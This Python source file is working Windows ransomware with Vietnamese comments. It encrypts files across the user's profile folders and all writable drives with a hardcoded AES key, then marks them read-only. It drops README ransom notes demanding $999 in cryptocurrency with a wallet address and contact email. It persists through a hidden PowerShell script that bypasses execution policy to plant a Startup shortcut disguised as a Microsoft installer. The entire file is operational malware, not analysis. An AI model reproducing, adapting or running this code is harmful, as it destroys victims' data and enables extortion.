from os import remove
from os import chdir
from os import getcwd
from os import stat
from os import path
from subprocess import call
from time import sleep
from getpass import getuser
from threading import Thread
from threading import active_count
from Crypto.Cipher import AES


key = b'd68681d6e426a898c5341ee32e4f1f77'

def contact_me():
    with open("README.txt", 'w') as fin:
        fin.write("****** All Your Files Are Encrypted ******\n")
        fin.write("\n")
        fin.write("+ Don't Worry, I Can Help You Decrypted Them...\n")
        fin.write("\n")
        fin.write("+ Send $999(ETH,BTC,...) To Address: '0xaEafA51Aeb9921B42508C3F42EB0783533bdf10A'...\n")
        fin.write("\n")
        fin.write("+ After, Send Your Mail And Phone Screenshot To: 'thetrustor357@dnmx.org'...\n")
        fin.write("\n")
        fin.write("+ I Will Help You ...\n")
        fin.write("\n")
        fin.write("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
        fin.write("+     (^.^)====== GOOD LUCK, HAVE A GOOD DAY =======(^.^)     +\n")
        fin.write("+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n")
#-----------------------------------------------------------------------------------------
def get_path_file(file_name):
    # liet ke tat ca cac duong dan cua file tu 1 path goc
    call(f"dir *.* /s /b > {file_name}",  shell=True)
    with open(f"{file_name}", mode = 'r') as fin:
        all_locate = fin.readlines()
    remove(f"{file_name}")

    all_path_file = []
    for file in all_locate:
        # file la duong dan
        file = str(file).strip('\n')
    #1 locate thu muc
        if '.' not in file.split('\\')[-1]: continue
    #2 file read me
        if "README" in file.split('\\')[-1]: continue
    #3 file name đã bị xóa
        if f'{file_name}' in file.split('\\')[-1]: continue
    #4 file read only -> để lần sau tiếp tục chạy file khác mà ko lỗi   
        if stat(f"{file}").st_mode == 33060: continue
    #5 file > 1gb
        if int(stat(f"{file}").st_size) > 1000000000: continue
    #6 file ko quan trọng
        if ('.exe' or '.msi' or '.iso' or '.mp3' or '.mp4') in f"{file}": continue

        try: 
            all_path_file.append(file)
        except: continue

    del all_locate
    return all_path_file
        
#-----------------------------------------------------------------------------------------
# encrypt file va chuyển trạng thái file thành read only
from Crypto.Cipher import AES
def encrypt(path_file):
    with open(f'{path_file}', 'rb') as fin:
        data = fin.read()
    cipher = AES.new(key, AES.MODE_EAX)
    text, tag = cipher.encrypt_and_digest(data)
    nonce = cipher.nonce
    with open(f"{path_file}", 'wb') as fin:
        fin.write(text)
        fin.write(b'tag:' + tag)
        fin.write(b'nonce:' + nonce)
    call(f"attrib +r {path_file}", shell = True) 

#-----------------------------------------------------------------------------------------
# return disk: list disks on windows
def Ds_Disk():
    # ham nay tra ve danh sach o dia []
    call("fsutil fsinfo drives > name_disk.txt", shell = True)
    with open("name_disk.txt", 'r') as fin:
        name_disk = fin.read()
    remove("name_disk.txt")
    name_disk = name_disk.strip()
    name_disk = name_disk[8:]   
    name_disk = name_disk.split(' ')
    return name_disk

#-----------------------------------------------------------------------------------------
# return DS_DISK_OK: Lists Disks Truy Cap - Ghi Data Vao Duoc
def check_disk_1():
    # check xem nhung o nao truy cap vao duoc
    # thử tạo 1 file xem ổ đó có đang bị bảo vệ hay ko(làm gây lỗi chương trình); nếu tạo dc thì mới thêm ổ đó vào ds(mặc định phải có ô )
    DS_DISK_OK = []
    name_disk = Ds_Disk()
    for disk in name_disk:  
        try:
            chdir(disk)  # thử chuyển đến ổ đĩa đó 
            if getcwd() == "C:\\":
                DS_DISK_OK.append(disk)
                continue 
            else:
                if call("echo Hey > tttttt.txt", shell = True) == 0:
                    DS_DISK_OK.append(disk)
                    remove("tttttt.txt")
        except: continue
    del name_disk
    return DS_DISK_OK

#-----------------------------------------------------------------------------------------
# ma hoa trong cac o dia khac o c
def enc_in_disk(disk,file_name):  
    contact_me()
    all_path = get_path_file(file_name)
    for i in all_path:
        try:
            encrypt(f"{i}")                      
        except: continue

#-----------------------------------------------------------------------------------------
# ma hoa o c
def enc_in_disk_C(file_name):
    user = getuser()
    path_root = f"C:\\Users\\{user}\\"
 # vao thu muc nguoi dung hien tai       
    chdir(path_root)          
   
    call("dir /b > thu_muc.txt", shell = True)
    with open("thu_muc.txt", 'r') as fin:
        thu_muc = fin.readlines()
    remove("thu_muc.txt")

 # lọc bỏ các file, các thư mục ko cần thiết đang cùng path với desktop,...
    DIC = [] 
    for i in thu_muc:       
        i = str(i).strip('\n')
        if '.' in i or i == "3D Objects" or i == "Contacts" or i == "Links" or i == "Searches" or i == "Favorites":
            continue
        else: DIC.append(i)
    del thu_muc

 # bat dau encrypt file *********
    for i in DIC:    
        path_root = f"C:\\Users\\{user}\\{i}\\"
    # chuyen toi thu muc desktop,...
        chdir(path_root)   
        contact_me()       
        all_path = get_path_file(file_name)
        for i in all_path:
            try:
                encrypt(f"{i}") 
            except: continue

#-----------------------------------------------------------------------------------------

#-----------------------------------------------------------------------------------------
def main():
    disks = check_disk_1()  # Lists Disks Truy Cap - Ghi Data Vao Duoc
 # xử lí ổ c cuối cùng -> luông chính sẽ thực hiện enc ổ c cùng lúc với các luồng khác(ổ khác) -> tối ưu dc 1 luồng
    for path_root in range(len(disks)-1,-1,-1):
        file_name = str(path_root) + "_name.txt"
        chdir(disks[path_root])  #chuyen den tung o dia -> lay path hien tai
    # xu li o c rieng
        if getcwd() == "C:\\":
            enc_in_disk_C(file_name)              
    # encrypt cac o dia con lai
        else:
            t = Thread(target=enc_in_disk, args=(disks[path_root], {file_name}))
            t.start()
            sleep(0.2) # chờ 0.2s để luồng mới bắt đầu -> tránh lỗi... 
 # chờ tất cả các luồng con xong hết mới thực hiện tiếp chương trình. 5s check 1 lần -> tối ưu hệ thống, và thời gian chạy của các luồng ngắn lại
    while(active_count() != 1): sleep(5)
#-----------------------------------------------------------------------------------------
def MAIN():
    
    path_start = getcwd()
    ten_file = "Microsoft Windows Service Installer.lnk"
    path2 = f"C:\\Users\\{getuser()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"

    # lan dau chay: chi them shortcut vao sartup ma thoi
    if path.isfile(f"{path2}\\{ten_file}") == False:    
        with open("shortcut.ps1", 'w') as fin:
            fin.write("$WshShell = New-Object -comObject WScript.Shell\n")
            fin.write(f"$Shortcut = $WshShell.CreateShortcut('{path2}Microsoft Windows Service Installer.lnk')\n")
            fin.write(f"$Shortcut.TargetPath = '{path_start}\Microsoft Windows Service Installer.exe'\n")
            fin.write(f"$Shortcut.WorkingDirectory = '{path_start}'\n")
            fin.write("$Shortcut.Save()")
        call("attrib +h shortcut.ps1", shell=True)
        call(f'''powershell.exe -ExecutionPolicy Bypass -Command "& '{path_start}\\shortcut.ps1'"''', shell=True)
        remove("shortcut.ps1")

    # lan mo may sau moi thuc hien
    else:
        sleep(10)
        main()
        # for i in range(50):
        #     time.sleep(5)
        #     try:
        #         subprocess.call(f"start C:\\Users\\{getpass.getuser()}\\Documents\\README.txt", shell=True)
        #     except: pass
#===============================================================================
MAIN()